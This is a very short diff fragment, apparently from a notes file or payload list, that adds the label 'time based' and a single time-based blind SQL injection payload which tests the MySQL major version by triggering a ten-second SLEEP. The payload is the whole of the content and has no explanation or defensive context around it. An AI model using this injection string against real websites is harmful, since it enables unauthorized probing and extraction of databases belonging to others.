@@ -1,0 +1,3 @@
+*time based
+
+iron man’ AND IF(substring(VERSION(),1,1) = ‘5’, SLEEP(10), 0)#
